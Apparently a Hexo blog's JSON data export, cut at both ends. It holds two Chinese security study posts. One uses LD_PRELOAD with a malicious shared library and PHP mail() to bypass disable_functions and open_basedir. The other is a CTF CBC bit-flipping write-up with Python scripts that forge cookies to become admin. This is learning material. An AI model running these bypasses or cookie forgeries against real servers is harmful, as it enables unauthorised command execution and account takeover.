dified":1529911998337}],"Category":[{"name":"安全","_id":"cjity3jq00014ly4j77i5uhbh"},{"name":"sql注入","parent":"cjity3jq00014ly4j77i5uhbh","_id":"cjity3jq8001dly4jvbo3edkj"}],"Data":[],"Page":[{"title":"分类","date":"2018-01-25T05:27:12.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2018-01-25 13:27:12\ntype: \"categories\"\ncomments: false\n---\n","updated":"2018-01-25T05:36:55.061Z","path":"categories/index.html","layout":"page","_id":"cjity3jol0001ly4jzr4vc5z0","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"标签","date":"2018-01-25T05:25:33.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-01-25 13:25:33\ntype: \"tags\"\ncomments: false\n---\n","updated":"2018-01-25T05:36:48.524Z","path":"tags/index.html","layout":"page","_id":"cjity3jyf001mly4jvdhixiip","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"LD_PRELOAD","date":"2018-06-04T02:10:00.000Z","_content":"\n# LRE_PAYLOAD绕过open_basedir\n\n参考链接:\n\n[利用环境变量LD_PRELOAD绕过disable_function执行系统命令](http://wooyun.jozxing.cc/static/drops/tips-16054.html)\n\n[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)\n\n源码:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid payload() {\n\tsystem(\"rm /tmp/check.txt\");\n}\nint  geteuid() {\n\tif (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n\tunsetenv(\"LD_PRELOAD\");\n\tpayload();\n}\n\n```\n\n编译:\n\n```\ngcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n```\n\nevil.php\n\n```\n<?php\nputenv(\"LD_PRELOAD=/var/www/html/preload/test.so\");\n\tmail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n执行evil.php ，可以发现check.txt被删除。\n\n列目录的payload:\n\n```\n#include <dirent.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(\"/\");\n    FILE  *fp;\n    fp=fopen(\"/tmp/venenoveneno\",\"w\");\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,\"%s\\n\",ptr->d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(\"LD_PRELOAD\") == NULL) {\n        return 0;\n    }\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n\n\n","source":"_posts/LD-PRELOAD.md","raw":"---\ntitle: LD_PRELOAD\ndate: 2018-06-04 10:10:00\ntags: pwn\n---\n\n# LRE_PAYLOAD绕过open_basedir\n\n参考链接:\n\n[利用环境变量LD_PRELOAD绕过disable_function执行系统命令](http://wooyun.jozxing.cc/static/drops/tips-16054.html)\n\n[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)\n\n源码:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid payload() {\n\tsystem(\"rm /tmp/check.txt\");\n}\nint  geteuid() {\n\tif (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n\tunsetenv(\"LD_PRELOAD\");\n\tpayload();\n}\n\n```\n\n编译:\n\n```\ngcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n```\n\nevil.php\n\n```\n<?php\nputenv(\"LD_PRELOAD=/var/www/html/preload/test.so\");\n\tmail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n执行evil.php ，可以发现check.txt被删除。\n\n列目录的payload:\n\n```\n#include <dirent.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(\"/\");\n    FILE  *fp;\n    fp=fopen(\"/tmp/venenoveneno\",\"w\");\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,\"%s\\n\",ptr->d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(\"LD_PRELOAD\") == NULL) {\n        return 0;\n    }\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n\n\n","slug":"LD-PRELOAD","published":1,"updated":"2018-06-08T06:29:58.578Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jod0000ly4jyg5lobd1","content":"<h1 id=\"LRE-PAYLOAD绕过open-basedir\"><a href=\"#LRE-PAYLOAD绕过open-basedir\" class=\"headerlink\" title=\"LRE_PAYLOAD绕过open_basedir\"></a>LRE_PAYLOAD绕过open_basedir</h1><p>参考链接:</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-16054.html\" target=\"_blank\" rel=\"noopener\">利用环境变量LD_PRELOAD绕过disable_function执行系统命令</a></p>\n<p><a href=\"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\" target=\"_blank\" rel=\"noopener\">PHP绕过open_basedir列目录的研究</a></p>\n<p>源码:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid payload() {\n    system(&quot;rm /tmp/check.txt&quot;);\n}\nint  geteuid() {\n    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    payload();\n}\n</code></pre><p>编译:</p>\n<pre><code>gcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n</code></pre><p>evil.php</p>\n<pre><code>&lt;?php\nputenv(&quot;LD_PRELOAD=/var/www/html/preload/test.so&quot;);\n    mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);\n?&gt;\n</code></pre><p>执行evil.php ，可以发现check.txt被删除。</p>\n<p>列目录的payload:</p>\n<pre><code>#include &lt;dirent.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(&quot;/&quot;);\n    FILE  *fp;\n    fp=fopen(&quot;/tmp/venenoveneno&quot;,&quot;w&quot;);\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,&quot;%s\\n&quot;,ptr-&gt;d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) {\n        return 0;\n    }\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    payload();\n}\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"LRE-PAYLOAD绕过open-basedir\"><a href=\"#LRE-PAYLOAD绕过open-basedir\" class=\"headerlink\" title=\"LRE_PAYLOAD绕过open_basedir\"></a>LRE_PAYLOAD绕过open_basedir</h1><p>参考链接:</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-16054.html\" target=\"_blank\" rel=\"noopener\">利用环境变量LD_PRELOAD绕过disable_function执行系统命令</a></p>\n<p><a href=\"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\" target=\"_blank\" rel=\"noopener\">PHP绕过open_basedir列目录的研究</a></p>\n<p>源码:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid payload() {\n    system(&quot;rm /tmp/check.txt&quot;);\n}\nint  geteuid() {\n    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    payload();\n}\n</code></pre><p>编译:</p>\n<pre><code>gcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n</code></pre><p>evil.php</p>\n<pre><code>&lt;?php\nputenv(&quot;LD_PRELOAD=/var/www/html/preload/test.so&quot;);\n    mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);\n?&gt;\n</code></pre><p>执行evil.php ，可以发现check.txt被删除。</p>\n<p>列目录的payload:</p>\n<pre><code>#include &lt;dirent.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(&quot;/&quot;);\n    FILE  *fp;\n    fp=fopen(&quot;/tmp/venenoveneno&quot;,&quot;w&quot;);\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,&quot;%s\\n&quot;,ptr-&gt;d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) {\n        return 0;\n    }\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    payload();\n}\n</code></pre>"},{"title":"cbc翻转","date":"2018-05-08T07:50:54.000Z","_content":"\n# CBC翻转攻击\n\n参考链接:\n\n1. https://blog.csdn.net/csu_vc/article/details/79619309\n2. http://wooyun.jozxing.cc/static/drops/tips-7828.html\n\n```php\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">;\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Login Form</title>\n<link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script type=\"text/javascript\" src=\"static/js/jquery.min.js\"></script>\n<script type=\"text/javascript\">\n$(document).ready(function() {\n    $(\".username\").focus(function() {\n        $(\".user-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".username\").blur(function() {\n        $(\".user-icon\").css(\"left\",\"0px\");\n    });\n    $(\".password\").focus(function() {\n        $(\".pass-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".password\").blur(function() {\n        $(\".pass-icon\").css(\"left\",\"0px\");\n    });\n});\n</script>\n</head>\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n</html>\n```\n\n首先确定解密后的字符串:\n\n> a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n\n第一步: 替换cookie中的cipher为反转后的cipher.\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username='zdmin'\nimport base64\nimport requests\nimport urllib\niv_raw='DbVDXiIkUNkqwCARqqpYew%3D%3D'  #这里填写第一次返回的iv值\ncipher_raw='27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'  #这里填写第一次返回的cipher值\nprint \"[*]原始iv和cipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]对cipher解码，进行反转\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"反转后的cipher：\" + xor_cipher\n```\n\n第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = 't8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#填写提交后所得的无法反序列化密文\niv = 'DbVDXiIkUNkqwCARqqpYew%3D%3D'#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n```\n\n\n\n","source":"_posts/cbc翻转.md","raw":"---\ntitle: cbc翻转\ndate: 2018-05-08 15:50:54\ntags: web安全\n---\n\n# CBC翻转攻击\n\n参考链接:\n\n1. https://blog.csdn.net/csu_vc/article/details/79619309\n2. http://wooyun.jozxing.cc/static/drops/tips-7828.html\n\n```php\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">;\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Login Form</title>\n<link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script type=\"text/javascript\" src=\"static/js/jquery.min.js\"></script>\n<script type=\"text/javascript\">\n$(document).ready(function() {\n    $(\".username\").focus(function() {\n        $(\".user-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".username\").blur(function() {\n        $(\".user-icon\").css(\"left\",\"0px\");\n    });\n    $(\".password\").focus(function() {\n        $(\".pass-icon\").css(\"left\",\"-48px\");\n    });\n    $(\".password\").blur(function() {\n        $(\".pass-icon\").css(\"left\",\"0px\");\n    });\n});\n</script>\n</head>\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n</html>\n```\n\n首先确定解密后的字符串:\n\n> a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n\n第一步: 替换cookie中的cipher为反转后的cipher.\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username='zdmin'\nimport base64\nimport requests\nimport urllib\niv_raw='DbVDXiIkUNkqwCARqqpYew%3D%3D'  #这里填写第一次返回的iv值\ncipher_raw='27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'  #这里填写第一次返回的cipher值\nprint \"[*]原始iv和cipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]对cipher解码，进行反转\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"反转后的cipher：\" + xor_cipher\n```\n\n第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:56:20\n# @Author  : csu_vc(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\nimport base64\nimport urllib\ncipher = 't8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#填写提交后所得的无法反序列化密文\niv = 'DbVDXiIkUNkqwCARqqpYew%3D%3D'#一开始提交的iv\ncipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#被损坏前正确的明文\nfor i in range(16):\n    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来\nprint urllib.quote(base64.b64encode(newIv))\n```\n\n\n\n","slug":"cbc翻转","published":1,"updated":"2018-06-25T06:34:48.491Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jom0002ly4j6bh2p92p","content":"<h1 id=\"CBC翻转攻击\"><a href=\"#CBC翻转攻击\" class=\"headerlink\" title=\"CBC翻转攻击\"></a>CBC翻转攻击</h1><p>参考链接:</p>\n<ol>\n<li><a href=\"https://blog.csdn.net/csu_vc/article/details/79619309\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/csu_vc/article/details/79619309</a></li>\n<li><a href=\"http://wooyun.jozxing.cc/static/drops/tips-7828.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/tips-7828.html</a></li>\n</ol>\n<pre><code class=\"php\">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&lt;title&gt;Login Form&lt;/title&gt;\n&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;\n&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\n$(document).ready(function() {\n    $(&quot;.username&quot;).focus(function() {\n        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);\n    });\n    $(&quot;.username&quot;).blur(function() {\n        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);\n    });\n    $(&quot;.password&quot;).focus(function() {\n        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);\n    });\n    $(&quot;.password&quot;).blur(function() {\n        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);\n    });\n});\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;?php\ndefine(&quot;SECRET_KEY&quot;, file_get_contents(&#39;/root/key&#39;));\ndefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);\nsession_start();\nfunction get_random_iv(){\n    $random_iv=&#39;&#39;;\n    for($i=0;$i&lt;16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];\n    setcookie(&quot;iv&quot;, base64_encode($iv));\n    setcookie(&quot;cipher&quot;, base64_encode($cipher));\n}\nfunction check_login(){\n    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){\n        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);\n        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);\n            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];\n        }else{\n            die(&quot;ERROR!&quot;);\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){\n        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;\n        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;\n    }else{\n        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;\n        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;\n    }\n    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;\n}\nif(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){\n    $username = (string)$_POST[&#39;username&#39;];\n    $password = (string)$_POST[&#39;password&#39;];\n    if($username === &#39;admin&#39;){\n        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);\n    }else{\n        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[&quot;username&quot;])){\n        check_login();\n        show_homepage();\n    }else{\n        echo &#39;&lt;body class=&quot;login-body&quot;&gt;\n                &lt;div id=&quot;wrapper&quot;&gt;\n                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;\n                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;\n                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;\n                        &lt;div class=&quot;header&quot;&gt;\n                        &lt;h1&gt;Login Form&lt;/h1&gt;\n                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;\n                        &lt;/div&gt;\n                        &lt;div class=&quot;content&quot;&gt;\n                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\&#39;\\&#39;&quot; /&gt;\n                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\&#39;\\&#39;&quot; /&gt;\n                        &lt;/div&gt;\n                        &lt;div class=&quot;footer&quot;&gt;\n                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;\n                        &lt;/div&gt;\n                    &lt;/form&gt;\n                &lt;/div&gt;\n            &lt;/body&gt;&#39;;\n    }\n}\n?&gt;\n&lt;/html&gt;\n</code></pre>\n<p>首先确定解密后的字符串:</p>\n<blockquote>\n<p>a:2:{s:8:”username”;s:5:”zdmin”;s:8:”password”;s:5:”12345”}</p>\n</blockquote>\n<p>第一步: 替换cookie中的cipher为反转后的cipher.</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Date    : 2018-03-15 11:45:57\n# @Author  : Mr.zhang(s4ad0w.protonmail.com)\n# @Link    : http://blog.csdn.net/csu_vc\n# username=&#39;zdmin&#39;\nimport base64\nimport requests\nimport urllib\niv_raw=&#39;DbVDXiIkUNkqwCARqqpYew%3D%3D&#39;  #这里填写第一次返回的iv值\ncipher_raw=&#39;27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D&#39;  #这里填写第一次返回的cipher值\nprint &quot;[*]原始iv和cipher&quot;\nprint &quot;iv_raw:  &quot; + iv_raw\nprint &quot;cipher_raw:  &quot; + cipher_raw\nprint &quot;[*]对cipher解码，进行反转&quot;\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;}\n#s:2:{s:8:&quot;userna\n#me&quot;;s:5:&quot;zdmin&quot;;\n#s:8:&quot;password&quot;;s\n#:3:&quot;12345&quot;;}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&#39;z&#39;) ^ ord(&#39;a&#39;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint &quot;反转后的cipher：&quot; + xor_cipher\n</code></pre>\n<p>第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n# -*- coding: 